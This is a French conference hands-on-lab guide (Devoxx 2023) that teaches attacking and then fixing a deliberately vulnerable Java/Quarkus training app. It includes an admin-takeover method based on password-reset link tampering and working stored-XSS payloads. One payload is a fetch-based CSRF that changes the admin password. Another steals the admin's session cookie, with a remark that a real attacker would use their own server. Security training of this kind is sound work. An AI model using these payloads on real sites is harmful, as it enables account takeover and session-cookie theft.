# Devoxx 2023
_HOL : Hacker son application JAVA pour mieux la sécuriser ensuite_

# Pré-requis
- Avoir JAVA 17 installé sur votre machine : https://jdk.java.net/archive/ ou https://adoptium.net/temurin/releases/
- Avoir Maven installé sur votre machine : https://maven.apache.org/download.cgi, puis https://maven.apache.org/install.html
- Importer le projet JAVA dans votre IDE préféré
- Lancer Quarkus : https://quarkus.io/guides/getting-started#running-the-application
- Puis mettez-vous directement en mode Hibernate "update", en décommentant la ligne 19 du fichier de configuration src/main/resources/application.properties et en commentant la ligne 18

````
#quarkus.hibernate-orm.database.generation=drop-and-create
quarkus.hibernate-orm.database.generation=update
````

# Cas 01 : Réinitialisation de mot de passe par envoi d'un lien

- Rendez-vous sur la page principale de cette application Java (sous Firefox, car Chrome n'aime pas http non sécurisé) : http://localhost:8081
- Il existe un compte administrateur créé automatiquement, vous ne le connaissez pas, mais vous allez devoir tenter de le découvrir.
- Vous allez maintenant créer un compte, via le bouton associé, le compte est automatiquement créé (on n'envoie pas de mail de confirmation ici pour simplification, mais simplement un mail de bienvenue que vous trouverez dans la log console de l'application)

## Description du cas fonctionnel

- Vous allez utiliser la fonction "J'ai oublié mon mot de passe", qui va vous demander votre email, puis va vous envoyer un email avec un lien spécifique.
- Ici, nous utilisons un mock pour le mail, donc le contenu du mail va apparaitre dans la console de votre IDE (vous pouvez le copier/coller dans un fichier html puis l'ouvrir avec votre navigateur)
- Lancer la réinitialisation du mot de passe et modifiez le
- Vérifiez que le nouveau mot de passe fonctionne bien (et que l'ancien ne fonctionne plus)

## Phase d'attaque

- Vous souhaitez prendre le contrôle de l'administrateur de l'application
- Vous devez deja trouver son email
- Puis vous allez utiliser la fonction d'oubli de mot de passe pour réinitialiser le mot de passe de l'administrateur avec un mot de passe de votre choix
    - Attention vous devez vous placer dans la peau d'un attaquant donc considérer que vous n'avez pas accès à la log console du serveur
- Vous allez enfin vous connecter en tant qu'administrateur

### Solution

- Vous créez un compte d'attaque avec un mail qui existe (car il faut pouvoir recevoir le mail avec le lien)
- Vous constatez que le mail de bienvenu provient de info@devoxx.com. Vous cherchez donc un autre compte qui pourrait être admin
    - Quand vous vous inscrivez, vous constatez que si vous vous inscrivez 2 fois, il vous dit que le mail est deja pris, cela va vous permettre de tester les comptes pour trouver l'admin => admin@devoxx.com
- Vous utilisez la fonction d'oubli de mot pour votre compte d'attaque => vous récupérez le lien correspondant
- Vous modifiez le lien en mettant l'adresse email de l'administrateur puis vous allez sur le lien
    - Attention vous devez effectuer la manipulation de modification du lien rapidement, car les demandes de changements de mots de passes expirent toutes les 5 minutes (Cf UserScheduleService#deleteReinitPasswordRequest)
- Vous remplissez le mot de passe que vous voulez, puis vous lancez la réinitialisation
- Vous pouvez ensuite vous connecter en tant qu'administrateur

## Phase de défense

- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !
- Les services REST de gestion des utilisateurs se trouvent dans la classe UsersResource, les process dans la classe UserService
- _OPTIONNEL_ : Mettez en évidence le problème par un nouveau test ou une modification du test UsersResourceTest#should_return_200_when_reinit_password_request_process
- _OPTIONNEL_ : Ajouter un logger de sécurité qui met en évidence :
    - Une action sensible (légitime) => [SECURITY OK]
    - Une action malveillante => [SECURITY WARN]
- Corrigez le problème

### Solution

- Nous pouvons modifier le test UsersResourceTest#should_return_200_when_reinit_password_request_process pour ajouter le comportement de l'attaquant, et ainsi vérifier que cette attaque est actuellement possible => le test doit être en erreur
- Il faut ensuite corriger le code, Cf UsersResource#reinitPassword, la ligne devient :
-
```
  if (reinitPasswordRequest == null || !reinitPasswordRequest.getId().equals(requestUuid) || !reinitPasswordRequest.email.equalsIgnoreCase(email)) {
```

- Et là le test passe au vert
  - Autre solution, on ne passe plus le paramètre email dans la requête, et on le récupère directement du ReinitPasswordRequest
- Pour les logs on peut ajouter un handler de security par exemple dans le fichier configuration.properties, avec une classe de log dédiée UserServiceSecurityLogger

```  
  #log

  quarkus.log.handler.console."SECURITY_LOGGING".format=%d{yyyy-MM-dd HH:mm:ss,SSS} SECURITY %-5p [%c{3.}] (%t) %s%e%n
  quarkus.log.category."org.tcollignon.user.service.UserServiceSecurityLogger".handlers=SECURITY_LOGGING
```

- Puis ajout de ligne de log du style :  LOG.warn("Anormal action was made for user " + user.email);

# Cas 02 : Modification de mot de passe dans sa page de profil

- Rendez-vous sur la page principale de cette application, puis identifiez-vous avec votre compte personnel
- Vous devriez ensuite avoir une page qui vous permet de modifier vos données personnelles : pseudo, mot de passe et description
- Faites un essai, vous pouvez normalement modifier ces informations sans problème (le mot de passe doit être de 6 caractères minimum s'il est renseigné)

## Description du cas fonctionnel

- Vous constatez qu'il est possible de changer de mot de passe sans devoir saisir la valeur de l'ancien mot de passe.
- Vous allez utiliser cette fonction pour tenter une nouvelle fois de modifier le mot de passe d'un autre compte => celui de l'admin
- Vous allez utiliser une faille XSS de l'application afin de pouvoir utiliser une faille CSRF

## Phase d'attaque

- Vous souhaitez prendre à nouveau le contrôle de l'administrateur de l'application, vous connaissez maintenant son email : admin@devoxx.com, et son mot de passe par défaut est devoxxinternet (mais vous l'avez surement déjà modifié dans le cas 01)
- Dans cet exercice vous devez alterner entre la position d'attaquant (un utilisateur standard connecté) et celle de l'administrateur de l'autre, c'est un genre de jeu de rôle.
  - Vous pouvez ouvrir une session de navigation privée sur firefox (ctrl+shift+p) pour vous connecter en administrateur. 
  - Vous analysez le contenu de la page "voir les utilisateurs" et comprenez que certaines informations remplies par les utilisateurs se retrouvent sur cette page.
  - Vous tentez d'exploiter dans un premier temps une vulnérabilité de type Stored XSS qui consiste à afficher une popup lorsque l'utilisateur click sur "voir les utilisateurs".
  - Une fois la preuve de concept établie, vous volez le cookie de l'utilisateur :
    - En l'affichant dans une pop-up
    - BONUS : En vous l'envoyant via une requête HTTP si vous disposez d'un serveur web accessible
- Vous changez le mot de passe de l'administrateur en lui faisant exécuter un changement de mot de passe à son insu et ce, sans utiliser le cookie volé au préalable : attaque CSRF depuis XSS
- Vous contrôlez que la modification du mot de passe de l'administrateur a bien été prise en compte en vous connectant avec.

### Solution

- Vous créez un compte d'attaque et vous vous connectez avec
- Vous modifiez votre description pour y injecter un javascript permettant l'affichage d'une pop-up : <script>alert('TestDevoxxs')</script>
- Puis vous jouez le rôle de l'admin qui se connecte et se rend sur la page "les utilisateurs de l'application devoxx" via le bouton "Voir les utilisateurs"
- Une pop-up affichant TestDevoxxs devrait s'ouvrir ce qui démontre que la vulnérabilité XSS est exploitable.
- Depuis la session de l'utilisateur standard, vous lancez la modification de votre mot de passe afin de visualiser la requête lancée => c'est cette requête qu'il faut faire exécuter par l'administrateur via une attaque CSRF
- Afin de pouvoir faire exécuter la requête par l'admin, vous allez modifier votre description pour inclure du code javascript (et ainsi exploiter une faille XSS) qui va lancer cette requête via fetch
  - Lorsque l'admin ira voir la page "les utilisateurs de l'application devoxx", la requête javascript sera exécutée, en utilisant son cookie, et son mot de passe sera changé automatiquement
- La description peut-être modifiée comme ceci :
```
<script>
fetch("http://localhost:8081/users/myprofile", {
    "headers": {
        "Content-Type": "application/json",
    },
    "referrer": "http://localhost:8081/",
    "body": "{\"nickname\":\"admin\",\"firstName\":\"\",\"name\":\"\",\"email\":\"admin@devoxx.com\",\"desc\":\"\",\"password\":\"devoxxnew\",\"acceptNewsletter\":true}",
    "method": "POST"
});
</script>
```

- Puis vous vous connectez avec l'administrateur et clickez sur "Voir les utilisateurs"
- Son mot de passe vient d'être modifié, la requête de modification sur /users/myprofile est visible dans l'onglet réseau de votre navigateur depuis la session de l'administrateur
- Vous pouvez ensuite vous connecter en tant qu'administrateur avec ce nouveau mot de passe
- Bonus : Si vous souhaitez voler le cookie de l'admin voici une payload exemple que vous pouvez essayer dans le champ description
```
<script>var i=new Image;i.src="http://localhost:8081?cookie="+document.cookie;</script>
```

- Une fois exécutée, cette requête ainsi que le cookie de l'admin devraient être visibles dans l'onglet réseau de votre navigateur depuis la session de l'administrateur
- Dans la pratique le serveur:port dans l'url ci-dessus (localhost:8081) seraient remplacés par ceux du hacker afin que le cookie lui parvienne

## Phase de défense

- Maintenant que vous avez trouvé une faille dans cette application, il est temps de la corriger ! C'est tout de même vous qui maintenez cette application !